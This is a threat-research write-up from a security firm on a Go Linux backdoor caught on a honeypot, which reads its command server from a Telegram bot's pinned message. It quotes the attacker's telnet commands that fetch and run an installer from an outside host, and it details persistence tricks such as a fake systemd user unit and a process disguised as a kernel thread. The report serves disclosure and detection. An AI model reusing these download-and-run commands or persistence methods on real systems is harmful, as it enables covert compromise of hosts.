# A Go Linux backdoor that gets its orders from a Telegram bot

**KSI Digital threat research | 2026-10-06 | observed 2026-10-05/06**

A telnet session on our honeypot pulled down a small installer, `agent_i.sh`, that stages a Go backdoor built for eight Linux CPU architectures. The backdoor has no C2 address of its own. It asks a hardcoded Telegram bot for one: the bot's pinned chat message names the server, and `getUpdates` doubles as a fallback command channel. It's not Mirai, although the port it was first linked to carries a Mirai tag on ThreatFox.

Indicators: [`iocs.csv`](iocs.csv). Detection: [`detection/`](detection/).

## Delivery

On 2026-10-05 19:31 UTC, 176.65.134[.]119 logged in to our Cowrie honeypot over telnet with an empty username and password and ran:

```
cd /tmp
wget -qO /tmp/.i.sh http://176.65.134[.]119:80/agent_i.sh
ls /tmp/.i.sh || curl -o /tmp/.i.sh http://176.65.134[.]119:80/agent_i.sh
sh /tmp/.i.sh 176.65.134[.]119:80 http://176.65.134[.]119:80 x86_64 33 62
```

The same host serves the installer and the payloads, and it's the host that logs in. The installer (`2c2511a8...`, 1,971 bytes) calls itself a "minimal hang-proof installer for telnet-reached hosts" and its comments read like an operator's notes from running it at scale ("multi-retry x 8 arches = 100MB = hang", "duplicates caused a reconnect storm (16.5M/day)"). For each architecture in turn it downloads `agent_<arch>` to `/tmp/.g_<arch>`, runs it with `--selftest` and keeps the first build that prints `SELFTEST_OK`. Then it kills older copies and prints a status line like `STAGE_OK STAGED x86_64 PROOF=2046 C2_OK`. `PROOF` is the product of the last two arguments (33 x 62), which a real shell has to compute. A honeypot that just echoes the script back can't, so this is a check that the target is real.

On 2026-10-06 the host was serving an updated installer (`3f17516c...`, 2,786 bytes). It adds a node.js download fallback, with the comment "node-only hosts exist (Next.js containers!)", and it kills old copies by matching `/proc/*/exe` because, as its comment says, the agent renames its process name. The Next.js comment fits with an anonymous ThreatFox report that tags 176.65.134[.]119:4444 with React2Shell (CVE-2025-55182). We haven't seen that delivery path ourselves.

## The agent

We fetched all eight builds from the host inside our isolated lab: x86_64, i686, aarch64, armv7, mips, mipsle, mips64 and mips64le. They're statically linked Go binaries (Go 1.27.1, module name `agent`) with the same code and the same configuration in each. The function names left in the binary describe the design:

- `resolveC2`, `tgGetPinned`, `parseC2Line` - read the pinned message of a Telegram chat through the bot API (`getChat?chat_id=`) and parse a C2 address out of it;
- `sendHello`, `handleLine`, `runCmd` - check in with that server and run the shell commands it sends;
- `telegramFallbackLoop`, `tgGetUpdates`, `tgSend` - poll the bot (`getUpdates?limit=20`) and answer with `sendMessage` when the C2 server can't be reached;
- `installPersistence`, `persistenceLoop` - install and keep reinstalling its persistence.

Every build carries the same bot (ID `8850962001`) and the same chat ID, `-1004441259610`. We publish the bot ID but not the secret half of the token, because anyone holding the full token can control the bot. The full token is on ThreatFox for defenders.

Persistence, from the strings in the binary:

- a systemd **user** unit named `systemd-logind.service` with `Description=System Logging Helper`, `Restart=always` and `WantedBy=default.target`, enabled through `systemctl --user`. The name copies the real system service, but the real one is never a user unit;
- a `@reboot` crontab entry, plus launch lines appended to `.bashrc` and `.profile` and an rc entry;
- a running process that renames itself to `[kworker/0:1-events]` so it looks like a kernel worker thread;
- a lock file `/tmp/.<name>.lock`. Copies live under `/tmp/.g_<arch>` and `.gsvc_*` paths, according to the installer's kill list.

The agent ignores the C2 address the installer passes on its command line. Its own selftest prints `SELFTEST_OK amd64`.

## What we saw when it ran

We ran the x86_64 build first fully offline, then on 2026-10-06 with exactly two destinations reachable: the Telegram API (149.154.166.110:443) and 176.65.134[.]119:4444. In about three minutes it made a single TLS connection with SNI `api.telegram.org` and held it open (around 15 KB in total, the pattern of a long poll). It never connected to 176.65.134[.]119:4444, or tried anything else. So for this build, Telegram is the channel actually in use. We didn't read the content of that TLS session, so we can't say what the pinned message currently contains.

## Indicators

| Indicator | Role |
| --- | --- |
| `api.telegram[.]org/bot8850962001:<redacted>/` | Telegram bot used as C2 (full token on ThreatFox) |
| chat ID `-1004441259610` | Telegram chat the agent reads its C2 address from |
| `176.65.134[.]119:80` | installer and payload host; also the telnet source |
| `176.65.134[.]119:4444` | reported as C2 by others (ThreatFox, anonymous); not contacted by our run |
| `a4f5bec5e206...` and 7 more | `agent_<arch>` builds, full list in [`iocs.csv`](iocs.csv) |
| `2c2511a8da4d...`, `3f17516cc8a5...` | `agent_i.sh` installer, two versions |
| `systemd-logind.service` user unit, `[kworker/0:1-events]` | host artifacts |

## Detection ideas

Rules are in [`detection/`](detection/). On a Linux host, the strongest signals are:

- `~/.config/systemd/user/systemd-logind.service` exists at all, or a user unit with `Description=System Logging Helper`;
- a process named `[kworker/...]` whose parent isn't `kthreadd` (PID 2), or whose `/proc/<pid>/exe` points to a file. Real kernel threads have no executable;
- files named `/tmp/.g_<arch>` or `/tmp/.g_out`;
- a server with no business talking to Telegram holding long connections to `api.telegram.org`.

## Reporting status

- ThreatFox: the bot URL (botnet_cc, conf 90) and the eight build hashes (payload, conf 100), KSI Digital 2026-10-06; installer host 176.65.134[.]119:80 (KSI Digital 2026-10-06).
- MalwareBazaar: installer `3f17516c...` (KSI Digital); `agent_x86_64` and the older installer were already there.
- Telegram: report to Telegram's abuse team pending.

## Handling

The installer was captured passively. The agent ran in an isolated lab whose egress fails closed; for the live run, only the two destinations above were reachable, for a few minutes. We didn't interact with the bot or the chat.

Contact: christophe@ksi-digital.com | abuse.ch `@ksi_digital` | Licensed [CC BY 4.0](https://creativecommons.org/licenses/by/4.0/)
